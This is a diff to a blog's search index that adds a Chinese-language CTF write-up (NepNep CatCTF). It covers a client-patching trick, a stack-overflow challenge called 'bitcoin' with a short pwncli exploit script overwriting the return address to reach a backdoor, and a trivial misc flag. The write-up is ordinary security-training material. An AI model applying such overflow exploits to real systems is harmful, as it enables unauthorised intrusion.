@@ -4,6 +4,43 @@
   
   
   <entry>
+    <title>NepNep_Catctf_wp</title>
+    <link href="/2023/01/02/NepNep-Catctf-wp/"/>
+    <url>/2023/01/02/NepNep-Catctf-wp/</url>
+    
+    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>给了一个server文件和client文件</li><li>client要求输入ip和port，然后进入一个地图界面</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>猜测远程跑在server，直接ida动调，patch本地的client，然后直接拿远程的flag</li></ul><h2 id="bitcoin"><a href="#bitcoin" class="headerlink" title="bitcoin"></a>bitcoin</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul><li>C++程序，login输入用户名和密码时可溢出</li><li>Block构造函数会读写flag</li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul><li>直接栈溢出返回到后门</li><li>需要注意的是menu函数内的bitcoin_start函数内fork了一个子程序，调试时需要设置下set follow-fork-mode parent跟父进程</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-31 22:06:36</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br>rl()<br>rl()<br>sl()<br>ru(<span class="hljs-string">&quot;Name: &quot;</span>)<br>sl(<span class="hljs-string">&quot;aa&quot;</span>)<br>ru(<span class="hljs-string">&quot;Password: &quot;</span>)<br>stop()<br>sl(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">64</span>+p64_ex(<span class="hljs-number">0x609a00</span>)+p64_ex(<span class="hljs-number">0x0000000000404EA4</span>))<br>stop()<br>ia()<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ul><li>直接cat 给的附件，有flag明文</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>Pwn</category>
+      
+      <category>Misc</category>
+      
+      <category>NepNep</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>NepNep</tag>
+      
+      <tag>CatCtf</tag>
+      
+      <tag>WP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>inndy_stack</title>
     <link href="/2022/12/10/inndy-stack/"/>
     <url>/2022/12/10/inndy-stack/</url>
@@ -26,11 +63,11 @@
       
       <tag>CTF</tag>
       
+      <tag>WP</tag>
+      
       <tag>BUU</tag>
       
       <tag>PWN</tag>
-      
-      <tag>WP</tag>
       
     </tags>
     
@@ -61,11 +98,11 @@
       
       <tag>CTF</tag>
       
+      <tag>WP</tag>
+      
       <tag>BUU</tag>
       
       <tag>PWN</tag>
-      
-      <tag>WP</tag>
       
     </tags>
     
@@ -123,11 +160,11 @@
       
       <tag>CTF</tag>
       
+      <tag>WP</tag>
+      
       <tag>BUU</tag>
       
       <tag>PWN</tag>
-      
-      <tag>WP</tag>
       
     </tags>
     
